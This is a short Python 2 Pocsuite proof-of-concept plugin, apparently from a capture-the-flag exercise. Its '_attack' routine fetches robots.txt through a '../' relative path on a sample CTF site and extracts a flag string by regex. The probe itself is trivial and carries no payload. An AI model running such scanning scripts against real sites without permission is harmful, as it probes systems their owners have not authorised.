import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class TestPOC(POCBase):
    appName='CTF'
    name='CheckRobots'
    vulID='00000'
    version='1.0'
    author='LzSkyline'
    vulDate='0000-00-00'
    createDate='2017-09-25'
    updateDate='2017-09-25'
    references=['https://www.seebug.org/vuldb/ssvid-00000']
    appPowerLink='https://www.lzskyline.com'
    appVersion='0.0.0'
    vulType='Others'
    desc='https://www.seebug.org/'
    samples=['http://chinalover.sinaapp.com/web1/']
    def _attack(self):
        result={}
        if self.url.endswith('/'):
            vulurl = self.url + "../robots.txt"
        else:
            vulurl = self.url + "/../robots.txt"
        payload=""
        param={}
        resp=req.get(vulurl,params=param,allow_redirects=False)
        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['TextFlag']=self.params['name'] + "{" + match_result.group(1) + "}"
        if resp.status_code == 200:
            result['FlagInfo']={}
            result['FlagInfo']['FileContent']="\n" + resp.content
        return self.parse_attack(result)
    
    def _verify(self):
        result={}
        vulurl=self.url + "/robots.txt"
        payload=""
        param={}
        resp=req.get(vulurl,params=param,allow_redirects=False)
        if resp.status_code == 200:
            result['FlagInfo']={}
            result['FlagInfo']['robots.txt']="Existed"

        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

        
register(TestPOC)
        
